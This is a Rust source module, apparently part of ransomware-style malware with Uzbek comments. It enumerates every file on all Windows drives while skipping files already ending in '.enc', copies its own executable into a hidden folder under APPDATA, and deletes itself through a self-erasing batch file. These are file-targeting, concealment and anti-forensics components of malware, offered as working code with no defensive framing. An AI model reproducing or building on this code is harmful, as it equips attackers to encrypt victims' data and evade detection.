use std::env;
use std::fs;
use std::io::Write; // Write trait'ini import qilish
use std::path::{Path, PathBuf};
use std::process::Command;
use walkdir::WalkDir;

pub fn collect_paths(excluded_paths: &[&str]) -> Result<Vec<PathBuf>, Box<dyn std::error::Error>> {
    let mut paths = Vec::new();
    for drive in ["A", "B", "C", "D", "E", "F", "G", "H", "I", "J", "K", "L", "M", "N", "O", "P", "Q", "R", "S", "T", "U", "W", "X", "Y", "Z"] {
        let root = format!("{}:\\", drive);
        if Path::new(&root).exists() {
            for entry in WalkDir::new(&root).into_iter().filter_map(Result::ok) {
                let p = entry.into_path();
                if p.is_file()
                    && !excluded_paths
                        .iter()
                        .any(|ex| p.to_string_lossy().contains(ex))
                    && !p.to_string_lossy().ends_with(".enc")
                {
                    paths.push(p);
                }
            }
        }
    }
    Ok(paths)
}

pub fn copy_and_hide_exe(current_exe: &Path) -> Result<PathBuf, Box<dyn std::error::Error>> {
    let mut dest_dir = env::var("APPDATA").unwrap_or_else(|_| "C:\\Users\\Public".into());
    dest_dir.push_str("\\NonShared");
    let dest_dir = PathBuf::from(dest_dir);
    fs::create_dir_all(&dest_dir)
        .map_err(|e| format!("Create dir error {}: {}", dest_dir.display(), e))?;
    let file_name = current_exe.file_name().ok_or("Exe file name missing")?;
    let dest_exe = dest_dir.join(file_name);

    if current_exe != dest_exe {
        if dest_exe.exists() {
            fs::remove_file(&dest_exe)
                .map_err(|e| format!("Remove existing file error {}: {}", dest_exe.display(), e))?;
            println!("[*] Existing file removed: {:?}", dest_exe);
        }
        fs::copy(current_exe, &dest_exe)
            .map_err(|e| format!("Copy exe error {}: {}", dest_exe.display(), e))?;
        println!("[*] Copied to {:?}", dest_exe);

        let status = Command::new("attrib")
            .args(&["+h", dest_exe.to_string_lossy().as_ref()])
            .status()
            .map_err(|e| format!("Attrib error: {}", e))?;
        if !status.success() {
            eprintln!("[-] Failed to hide file: {}", dest_exe.display());
        } else {
            println!("[*] Hidden via attrib +h");
        }
    }
    Ok(dest_exe)
}

pub fn delete_self(current_exe: &Path) -> Result<(), Box<dyn std::error::Error>> {
    // O'zini o'chirish uchun Windowsda batch fayl yaratish
    let batch_path = current_exe.with_extension("bat");
    let mut batch = fs::File::create(&batch_path)?;
    writeln!(batch, "@echo off")?;
    writeln!(batch, ":loop")?;
    writeln!(batch, "del \"{}\" > nul 2>&1", current_exe.display())?;
    writeln!(batch, "if exist \"{}\" (", current_exe.display())?;
    writeln!(batch, "    timeout /t 1 /nobreak > nul")?;
    writeln!(batch, "    goto loop")?;
    writeln!(batch, ")")?;
    writeln!(batch, "del \"%~f0\"")?; // Batch o'zini o'chiradi
    batch.flush()?;
    batch.sync_all()?;

    // Batch faylni ishga tushirish
    let status = Command::new("cmd")
        .arg("/C")
        .arg(batch_path.to_string_lossy().as_ref())
        .spawn()
        .map_err(|e| format!("Failed to spawn batch file: {}", e))?;
    println!("[*] O'zini o'chirish jarayoni boshlandi: {:?}", status.id());
    Ok(())
}